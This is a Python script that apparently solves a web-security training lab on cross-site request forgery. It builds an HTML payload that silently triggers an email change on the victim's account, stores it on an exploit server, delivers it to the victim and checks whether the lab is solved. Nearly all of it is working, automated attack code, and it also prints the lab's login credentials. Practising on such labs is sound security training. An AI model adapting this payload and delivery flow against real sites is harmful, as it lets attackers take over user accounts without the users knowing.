import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def csrf_attack(url, exploit_server):
    # PAYLOAD
    payload = '<html><body><img src="{0}/my-account/change-email?email=victim%40gothacked" onerror=alert(1)></body></html>'.format(url)

    # STORE PAYLOAD
    params = {
        'urlIsHttps' : 'on',
        'responseFile' : '/exploit',
        'responseHead' : 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8',
        'responseBody' : payload,
        'formAction' : 'STORE'
    }

    r = requests.post(exploit_server, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Could not store payload")
        sys.exit(-1)

    # DELIVER TO VICTIM
    params['formAction'] = 'DELIVER_TO_VICTIM'

    r = requests.post(exploit_server, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Could not deliver payload to vitcim")
        sys.exit(-1)

    # CHECK IF EXPLOIT SUCCEEDED
    r = requests.get(url, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Lab solved! Exploit successful!")


def main():
    if len(sys.argv) != 3:
        print("[-] Usage: %s <url1> <url2>" % sys.argv[0])
        print("[-] Example: %s www.vulnerable-webiste.com www.exploitserver.com" % sys.argv[0])
        sys.exit(-1)


    url = sys.argv[1].strip()
    exploit_server = sys.argv[2].strip()

    print("[+] Lab: CSRF where token validation depends on request method")
    print("""[+] This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
    To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: wiener:peter""")

    csrf_attack(url, exploit_server)

if __name__ == "__main__":
    main()